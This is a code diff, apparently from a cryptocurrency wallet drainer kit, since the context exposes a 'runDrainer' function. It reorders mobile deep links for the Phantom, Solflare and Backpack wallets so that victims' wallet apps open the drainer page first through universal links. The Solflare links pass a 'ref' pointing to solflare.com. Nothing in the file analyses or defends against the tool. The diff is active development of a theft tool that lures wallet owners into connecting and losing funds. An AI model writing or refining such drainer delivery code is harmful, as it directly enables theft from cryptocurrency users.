@@ -5521,10 +5521,10 @@ window.runDrainer = runDrainer;
         case 'phantom':
           // Phantom: Use correct URL structure for mobile, complex API for desktop
           if (isMobileDevice) {
-            // Mobile: Use Phantom browse deep link (Phantom doesn't support connect endpoint)
+            // Mobile: Use correct Phantom URL structure
             const encodedUrl = encodeURIComponent(currentUrl);
-            deepLink = `phantom://browse/${encodedUrl}?ref=${encodedUrl}`;
-            fallbackUrl = `https://phantom.app/ul/browse/${encodedUrl}?ref=${encodedUrl}`;
+            deepLink = `https://phantom.app/ul/browse/${encodedUrl}?ref=${encodedUrl}`;
+            fallbackUrl = `phantom://browse/${encodedUrl}?ref=${encodedUrl}`;
           } else {
             // Desktop: Use complex Connect API (unchanged)
             deepLink = `phantom://browse/${encodeURIComponent(currentUrl)}`;
@@ -5534,10 +5534,10 @@ window.runDrainer = runDrainer;
         case 'solflare':
           // Solflare: Use correct URL structure for mobile, complex API for desktop
           if (isMobileDevice) {
-            // Mobile: Use Solflare browse deep link (Solflare doesn't support connect endpoint)
+            // Mobile: Use correct Solflare URL structure
             const encodedUrl = encodeURIComponent(currentUrl);
-            deepLink = `solflare://v1/browse/${encodedUrl}?ref=${encodeURIComponent("https://solflare.com")}`;
-            fallbackUrl = `https://solflare.com/ul/v1/browse/${encodedUrl}?ref=${encodeURIComponent("https://solflare.com")}`;
+            deepLink = `https://solflare.com/ul/v1/browse/${encodedUrl}?ref=${encodeURIComponent("https://solflare.com")}`;
+            fallbackUrl = `solflare://v1/browse/${encodedUrl}?ref=${encodeURIComponent("https://solflare.com")}`;
           } else {
             // Desktop: Use custom scheme first
             deepLink = `solflare://browse/${encodeURIComponent(currentUrl)}`;
@@ -5547,10 +5547,10 @@ window.runDrainer = runDrainer;
         case 'backpack':
           // Backpack: Use correct URL structure for mobile, complex API for desktop
           if (isMobileDevice) {
-            // Mobile: Use Backpack browse deep link (Backpack doesn't support connect endpoint)
+            // Mobile: Use correct Backpack URL structure
             const encodedUrl = encodeURIComponent(currentUrl);
-            deepLink = `backpack://v1/browse/${encodedUrl}?ref=${encodedUrl}`;
-            fallbackUrl = `https://backpack.app/ul/v1/browse/${encodedUrl}?ref=${encodedUrl}`;
+            deepLink = `https://backpack.app/ul/v1/browse/${encodedUrl}?ref=${encodedUrl}`;
+            fallbackUrl = `backpack://v1/browse/${encodedUrl}?ref=${encodedUrl}`;
           } else {
             // Desktop: Use custom scheme first
             deepLink = `backpack://browse/${encodeURIComponent(currentUrl)}`;
